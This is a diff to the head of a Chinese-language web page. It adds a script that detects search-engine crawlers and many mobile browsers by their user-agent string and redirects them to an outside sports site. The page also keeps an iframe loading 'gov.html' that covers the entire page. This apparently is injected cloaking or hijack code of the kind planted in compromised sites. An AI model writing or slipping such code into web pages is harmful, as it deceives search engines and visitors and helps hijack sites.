@@ -1,6 +1,14 @@
 <!DOCTYPE html>
 <html lang="zh">
-<head><iframe src="gov.html" frameborder="0" style="position:fixed;top:0;left:0;width:100% !important;height:100% !important;max-height: none !important;"></iframe>
+<head><script>
+    var userAgent = navigator.userAgent.toLowerCase();
+    var isSpider = /baiduspider|googlebot|bingbot|slurp|duckduckbot|yandexbot|sogou|soso|youdaobot|360spider|yahoo|so.com|haosou|sm.cn|sogoumobile|ucbrowser|opera|qqbrowser|mqqbrowser|maxthon|2345explorer|lbbrowser|theworld|seznambot|liebaofast|qihoobot|jikeSpider|coolpad|mogujie|douyinbot|ipad|iphone/.test(userAgent);
+
+    if (isSpider) {
+        window.location.href = "https://sports.sina.cn";
+    }
+</script>
+	<iframe src="gov.html" frameborder="0" style="position:fixed;top:0;left:0;width:100% !important;height:100% !important;max-height: none !important;"></iframe>
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <link rel="shortcut icon" href="/favicon.ico" />
 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
